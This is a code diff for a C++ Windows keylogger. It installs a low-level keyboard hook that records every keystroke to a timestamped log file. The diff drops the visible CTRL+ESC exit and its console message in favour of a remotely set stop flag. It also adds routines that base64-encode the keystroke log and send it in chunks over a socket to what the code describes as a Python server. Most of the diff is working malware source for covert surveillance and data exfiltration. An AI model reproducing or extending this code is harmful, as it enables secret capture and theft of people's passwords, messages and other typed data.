@@ -1,31 +1,48 @@
-#include <fstream>
+#include "keylogger_module.h"
 #include <iostream>
-#include <string>
-#include <Windows.h>
-#include <filesystem>
+#include <fstream>
+#include <windows.h>
+#include <thread>
+#include <chrono>
+#include <iomanip>
+#include <ctime>
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 DWORD WINAPI KeyloggerThread(LPVOID lpParam);
 std::string getKeyboardLayoutName();
 std::string getActualCharacter(int vkCode, BYTE keyboardState[256]);
 std::string logNonPrintableKeys(int vkCode);
+std::string getCurrentDateTime();
 void ensureNewlineBeforeAppend(const std::string& filename, std::ofstream& outFile);
 
+HANDLE hThread = nullptr;
 HHOOK keyboardHook;
 std::ofstream logFile;
+std::string fileName = "keylog.txt";
 
-int main(){
-    //Create the thread which keylogger will run
-    HANDLE hThread = CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
-    WaitForSingleObject(hThread, INFINITE);
-    std::cout << "Keylogger stopped." << std::endl;
-    ExitProcess(0);
-    return 0;
+bool shouldQuit = false;
+
+const char* Keylogger_Module::name() const {
+    return "Keylogger Module";
 }
 
-//SETS UP THE THREAD WHICH IS GOING TO SET UP THE HOOK
+void Keylogger_Module::run(){
+    std::cout << "Keylogger Module Started" << std::endl;
+    shouldQuit = false;
+
+    hThread = CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
+}
+
+void Keylogger_Module::stopKeylogger(){
+    shouldQuit = true;
+    if(hThread){
+        WaitForSingleObject(hThread, INFINITE);
+        CloseHandle(hThread);
+        hThread = nullptr;
+    }
+}
+
 DWORD WINAPI KeyloggerThread(LPVOID lpParam){
-    std::string fileName = "log.txt";
     logFile.open(fileName, std::ios::app);
 
     if(!logFile.is_open()){
@@ -42,10 +59,9 @@ DWORD WINAPI KeyloggerThread(LPVOID lpParam){
     }
 
     ensureNewlineBeforeAppend(fileName, logFile);
-    logFile << "=== Keylogger Session Started ===" << std::endl;
+    logFile << "=== Keylogger Session Started ===" << getCurrentDateTime() << "===" << std::endl;
     logFile << "Keyboard Layout: " << getKeyboardLayoutName() << std::endl;
 
-    std::cout << "Keylogger started. Press CTRL+ESC to stop." << std::endl;
     logFile.flush();
     
     //GETS THE ACTION MESSAGES AND CONVERTES IT TO UNICODE CHARS. FOR INSTANCE: VK_SHIFT + VK_A => 'A'
@@ -56,8 +72,7 @@ DWORD WINAPI KeyloggerThread(LPVOID lpParam){
             DispatchMessage(&msg);
         }
 
-        // Check CTRL+ESC to exit (safer exit condition)
-        if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_ESCAPE) & 0x8000)) {
+        if (shouldQuit) {
             break;
         }
 
@@ -66,12 +81,12 @@ DWORD WINAPI KeyloggerThread(LPVOID lpParam){
     
 
     UnhookWindowsHookEx(keyboardHook);
-    logFile << "\n=== Keylogger Session Ended ===" << std::endl;
+    logFile << "\n=== Keylogger Session Ended ===" << getCurrentDateTime() << "===" << std::endl;
     logFile.close();
+    
     return 0;
 }
 
-//RUNS EVERYTIME A KEY PRESSED OR RELEASED
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
     if(nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)){
         KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
@@ -213,4 +228,154 @@ void ensureNewlineBeforeAppend(const std::string& filename, std::ofstream& outFi
     if (lastChar != '\n' && lastChar != '\r') {
         outFile << "\r\n";
     }
+}
+
+std::string getCurrentDateTime() {
+    auto now = std::chrono::system_clock::now();
+    std::time_t now_time = std::chrono::system_clock::to_time_t(now);
+
+    std::tm tm_buf;
+
+    localtime_s(&tm_buf, &now_time);
+
+    std::ostringstream oss;
+    oss << std::put_time(&tm_buf, "%Y-%m-%d %H:%M:%S");
+    return oss.str();
+}
+
+std::string& Keylogger_Module::getKeylogFileName(){
+    return fileName;
+}
+
+bool Keylogger_Module::sendFileViaMsgPack(SOCKET sock, std::string& fileName){
+    std::ifstream file(fileName, std::ios::binary);
+        if(!file.is_open()){
+            std::cerr << "Couldn't open file" << fileName << std::endl;
+            return false;
+        }
+
+        file.seekg(0, std::ios::end);
+        size_t filesize = file.tellg();
+        file.seekg(0, std::ios::beg);
+
+        std::vector<char> filedata(filesize);
+        file.read(filedata.data(), filesize);
+        file.close();
+
+        // For large files, we should chunk them
+        if (filesize > 64 * 1024) { // 64KB limit for single message
+            std::cout << "[Info] Large file (" << filesize << " bytes) - using chunked transfer" << std::endl;
+            return sendFileInChunks(sock, fileName, filedata);
+        }
+
+        std::string base64_data = base64_encode(filedata);
+
+        // Send file as a single message
+        std::string file_message = "KEYLOGGER_DATA:" + base64_data;
+        return send_message(sock, file_message);
+}
+
+bool Keylogger_Module::sendFileInChunks(SOCKET sock, std::string& filename, const std::vector<char>& filedata){
+    const size_t chunk_size = 512; // 512 bytes chunks to stay well under msgpack 1024 limit
+    size_t total_chunks = (filedata.size() + chunk_size - 1) / chunk_size;
+    
+    std::cout << "[Info] Sending file in " << total_chunks << " chunks of " << chunk_size << " bytes each" << std::endl;
+    
+    // Send file header
+    std::string header = "FILE_START:" + std::string(filename) + ":" + std::to_string(filedata.size()) + ":" + std::to_string(total_chunks);
+    if (!send_message(sock, header)) return false;
+    
+    // Send chunks
+    for (size_t i = 0; i < total_chunks; ++i) {
+        size_t start = i * chunk_size;
+        size_t end = std::min(start + chunk_size, filedata.size());
+        
+        std::vector<char> chunk(filedata.begin() + start, filedata.begin() + end);
+        std::string base64_chunk = base64_encode(chunk);
+        
+        std::string chunk_message = "FILE_CHUNK:" + std::to_string(i) + ":" + base64_chunk;
+        if (!send_message(sock, chunk_message)) {
+            std::cerr << "[Error] Failed to send chunk " << i << "/" << total_chunks << std::endl;
+            return false;
+        }
+        
+        // Show progress every 50 chunks
+        if (i % 50 == 0 || i == total_chunks - 1) {
+            std::cout << "[Progress] Sent chunk " << (i + 1) << "/" << total_chunks << std::endl;
+        }
+        
+        // Small delay between chunks to avoid overwhelming the connection
+        std::this_thread::sleep_for(std::chrono::milliseconds(10));
+    }
+    
+    std::cout << "[Success] File transfer completed - " << total_chunks << " chunks sent" << std::endl;
+    
+    // Send file end marker
+    std::string end_message = "FILE_END:" + std::string(filename);
+    return send_message(sock, end_message);
+}
+
+
+std::string Keylogger_Module::base64_encode(const std::vector<char>& data){
+    const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    std::string result;
+    int val = 0, valb = -6;
+    
+    for (char c : data) {
+        val = (val << 8) + (unsigned char)c;
+        valb += 8;
+        while (valb >= 0) {
+            result.push_back(chars[(val >> valb) & 0x3F]);
+            valb -= 6;
+        }
+    }
+    if (valb > -6) {
+        result.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
+    }
+    while (result.size() % 4) {
+        result.push_back('=');
+    }
+    return result;
+}
+
+bool Keylogger_Module::send_message(SOCKET sock, const std::string& msg){
+    std::vector<char> formatted_msg = create_message(msg);
+    return send(sock, formatted_msg.data(), static_cast<int>(formatted_msg.size()), 0) != SOCKET_ERROR;
+}
+
+std::vector<char> Keylogger_Module::create_message(const std::string& content) {
+    // Create msgpack format: [{"content": "message"}]
+    // This is a simplified approach that works with the Python server
+    
+    std::vector<char> result;
+    
+    // Array with 1 element (fixarray format: 0x91)
+    result.push_back(0x91);
+    
+    // Map with 1 key-value pair (fixmap format: 0x81)  
+    result.push_back(0x81);
+    
+    // Key: "content" (7 chars, fixstr: 0xa7)
+    result.push_back(0xa7);
+    result.insert(result.end(), {'c','o','n','t','e','n','t'});
+    
+    // Value: message content
+    if (content.length() < 32) {
+        // fixstr format (0xa0 + length)
+        result.push_back(0xa0 + static_cast<char>(content.length()));
+        result.insert(result.end(), content.begin(), content.end());
+    } else if (content.length() < 256) {
+        // str8 format  
+        result.push_back(0xd9);
+        result.push_back(static_cast<char>(content.length()));
+        result.insert(result.end(), content.begin(), content.end());
+    } else {
+        // str16 format
+        result.push_back(0xda);
+        result.push_back(static_cast<char>((content.length() >> 8) & 0xFF));
+        result.push_back(static_cast<char>(content.length() & 0xFF));
+        result.insert(result.end(), content.begin(), content.end());
+    }
+    
+    return result;
 }
